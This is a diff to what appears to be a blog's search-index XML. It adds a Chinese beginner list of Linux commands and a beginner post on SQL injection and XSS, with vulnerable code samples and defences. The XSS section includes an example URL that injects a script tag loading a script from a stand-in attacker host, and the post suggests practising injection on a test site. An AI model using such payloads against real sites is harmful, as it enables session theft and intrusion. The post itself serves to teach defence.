@@ -210,6 +210,31 @@
     
     
     <entry>
+      <title>Liunx常用命令</title>
+      <link href="/2022/10/07/Liunx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+      <url>/2022/10/07/Liunx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<p>pwd：显示当前工作目录的绝对路径</p><pre><code>ls:（1）-a：显示当前目录的所有文件和目录包括隐藏的   （2）-l：一列表的方式显示信息</code></pre><p>mkdir：用于创建目录，默认是单级目录，创建多级目录加一个 -p即可</p><p>rmdir:删除空目录，如果目录下面有内容时不可以删除，如果要强行删除有内容的文件夹使用 rm -rf删除</p><p>touch指令：创建空文件</p><p>cp：拷贝指令，拷贝文件到指定目录。基本语法：cp [选项] source dest 其中-r代表可以使用递归复制的方式拷贝整个文件夹</p><p>mv:移动文件与目录或者重命名</p><pre><code>基本语法：（1）mv oldNameFile newNameFile （重命名）         （2）mv /temp/movefile /targetFolder (移动文件)</code></pre><p>cat：查看文件指令， cat [选项] 要查看的文件 -n ：显示行号</p><p>less:用来分屏查看文件内容</p><p>echo：输出内容到控制台 用法：echo [选项] [输出内容]</p><p>head：用于显示文件的开头部分内容，默认情况下是显示文件的前10行内容</p><p>tail：用于显示文件中尾部的内容，默认情况下tail指令显示文件的前10行内容。语法</p><pre><code>（1）tail文件：查看文件尾部10行内容（2）tail -n 5 文件 查看文件尾5行内容，数字可以随便（3）tail -f 文件 实时追踪该文档的所有更新</code></pre><p> $&gt;$ 指令和$&gt;&gt;$指令：输出重定向和追加</p><pre><code>基本语法：（1）ls -l &gt; 文件 （将列表的内容写入文件中覆盖的方式）        （2）ls -al &gt;&gt;文件  （将列表的内容追加写入到文件中）        （3）cat 文件1 &gt; 文件2 （将文件1的内容覆盖到文件2）</code></pre><p>ln：软连接也称为符号链接，类似于windows中的快捷方式，主要存放了链接其他文件的路径</p><pre><code>基本语法： ln -s [原文件或目录] [软链接名] （给原文件创建一个软链接）</code></pre><p>history：查看已经执行过的历史指令，也可以执行历史指令</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Liunx </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Liunx </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>深度学习面试(一)</title>
       <link href="/2022/04/07/day_one/"/>
       <url>/2022/04/07/day_one/</url>
@@ -256,6 +281,35 @@
             <tag> 深度学习 </tag>
             
             <tag> 面试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>浅谈SQL注入，XSS攻击</title>
+      <link href="/2019/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+      <url>/2019/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/</url>
+      
+        <content type="html"><![CDATA[<p>作为计算机小白，一直都认为黑客很牛逼所以简单的了解一下这反面的知识——信息安全<br>黑客是个英译词，译作Hacker。黑客攻击或者黑计算机的方式多种多样，主要分为两种：<br><code>（1）非破坏性的攻击：一般是为了扰乱系统的运行，并不盗窃系统资料，仅仅只是使服务器暂时失去对外提供服务的能力，通常采用拒绝服务攻击或信息炸弹</code><br> <code>（2）破坏性攻击：是以侵入他人电脑系统、盗窃系统保密信息、破坏目标系统的数据为目的</code><br> 常见的攻击有DDOS，CSRF，Dos等，通常通过的途径有病毒式，洪水式，系统漏洞等。<br> 下面简单的介绍几种</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p> <code> 常见的注入式攻击，通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句</code><a href="https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5/150289?fr=aladdin">添加链接描述</a><br> 造成可以进行SQL注入的本质原因就是未将代码与数据进行严格的隔离，导致用户在读取数据的时候，错误的把数据作为代码的一部分执行。<br> 下面举个简单的例子：</p><pre><code class="js">var testCondition;testCondition = Request.from(&quot;testCondition&quot;)var sql =&quot;select * from TableA where id=&#39;&quot;+ testCondition +&quot;&#39;&quot;;</code></pre><p>在上面的例子当中，如果用户输入的ID只是一个数字当然没有任何问题，但是如果用“;‘隔开后，在testCondition里面插入其他SQL语句，则会出现意想不到的结果。例如输入drop，delete等。例如你不小心输入”#--!#@”这样的字符然后保存使得数据库跟新就会使where后面的信息被注释掉了，执行语句就变成了</p><pre><code class="js">updata table set memo=&quot;&quot;# --! #(@&quot; where use_id=xxxxxxx;</code></pre><p>使得全数据库的memo字段的数据都被跟新了，而不是你一个人的数据。<br>下面有几个兄弟写的很详细，大家可以去看看<br>（1）<a href="https://blog.csdn.net/ylw_bk/article/details/78327748">最详细的SQL注入教程–易利伟</a><br>（2）<a href="https://www.cnblogs.com/pursuitofacm/p/6706961.html">web完全篇之SQL</a><br>（3）<a href="https://www.cnblogs.com/wang-sai-sai/p/10234568.html">SQL注入攻击</a><br>（4）<a href="https://cloud.tencent.com/developer/news/61383">用sql注入攻破网站</a><br>大家可以找个一个肉鸡网站去试试或者自己写一个肉鸡网站也是个不错的选择<br>SQL注入的危害极大，在进行程序设计时我们可以从下面几个方面进行预防</p><pre><code>（1）过滤用户输入参数中的特殊字符，从而降低被SQL注入的风险</code></pre><pre><code>（2）禁止使用字符串拼接的SQL语句，严格使用参数绑定传入的SQL参数</code></pre><pre><code>（3）合理使用数据库访问框架提供的防注入机制</code></pre><h2 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h2><pre><code class="html">    XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets,CSS) 的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞， 它允许恶意web用户将代码植入到提供给其它用户使用的页面中。即黑客通过技术手段向 正常用户请求的HTML页面中插入恶意脚本，从而可以执行任意脚本</code></pre><h6 id="xss的分类"><a href="#xss的分类" class="headerlink" title="xss的分类"></a>xss的分类</h6><p>（1）反射型XSS</p><pre><code>   恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。</code></pre><p>（2）存储型XSS</p><pre><code>     恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛等社交网站上，但OA系统，和CRM系统上也能看到它身影，比如某CRM系统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码，当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的XSS存储型攻击。</code></pre><p>  (3)  DOM型XSS</p><pre><code>其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。</code></pre><p>  比如在2011年微博左右XSS蠕虫攻击事件，攻击者就利用微博发布功能中未对action-data漏洞做有效的过滤，在发布微博信息的时候戴上了包含攻击脚本的URL，用户访问该微博是便疯狂加载恶意脚本，该脚本会让用户以自己的账号自动转发同一条微博，通过这样的病毒式扩散，大量用户受到攻击。<br>  下面举个简单的实例可能会导致反射型XSS的文件：</p><pre><code class="html">&lt;div&gt;&lt;h3&gt;反射型XSS实例&lt;/h3&gt;&lt;br&gt;用户:&lt;%=request.getParamer(&quot;useName&quot;)%&gt;&lt;br&gt;系统错误信息：&lt;%=request.getParamer(&quot;errorMessage&quot;)%&gt;&lt;div&gt;</code></pre><p>上面的代码从HTTP请求中取得了userName和errorMessage两个参数，并直接输出到HTML中用于展示，当构造这样一种URL时就出现了反射型XSS，用户便会执行脚本文件</p><pre><code class="js">http://xss.demo/self-xss.jsp?userName=666&lt;script&gt;alert(&quot;666&quot;)&lt;/script&gt;&amp;errorMessage=XSS实例&lt;script scr=http://hacker.demo/xss-script.js&gt;</code></pre><h5 id="XSS攻击的预防主要是通过对用户的输入数据进行过滤和转义，如使用jsonp框架对用户输入的字符串作XSS过滤，使用Sping框架中的HtmlUtils对用户输入的字符串做html转义等"><a href="#XSS攻击的预防主要是通过对用户的输入数据进行过滤和转义，如使用jsonp框架对用户输入的字符串作XSS过滤，使用Sping框架中的HtmlUtils对用户输入的字符串做html转义等" class="headerlink" title="XSS攻击的预防主要是通过对用户的输入数据进行过滤和转义，如使用jsonp框架对用户输入的字符串作XSS过滤，使用Sping框架中的HtmlUtils对用户输入的字符串做html转义等"></a>XSS攻击的预防主要是通过对用户的输入数据进行过滤和转义，如使用jsonp框架对用户输入的字符串作XSS过滤，使用Sping框架中的HtmlUtils对用户输入的字符串做html转义等</h5><p>下面是几篇写的较为详细的XSS攻击博客<br>（1）<a href="https://www.cnblogs.com/stefanieszx11/p/8602138.html">web安全之XSS攻击</a><br>（2）<a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label12">XSS跨站脚本攻击</a><br>（3）<a href="https://www.cnblogs.com/digdeep/p/4695348.html">XSS防御方法</a><br>（4）<a href="https://www.cnblogs.com/shawWey/p/8480452.html">浅谈XSS攻击原理</a><br>时间匆匆而逝，下次我再来分享一点点关于第三种黑客攻击：CSRF的知识</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 信息安全 </tag>
+            
+            <tag> SQL </tag>
+            
+            <tag> XSS </tag>
             
         </tags>
       
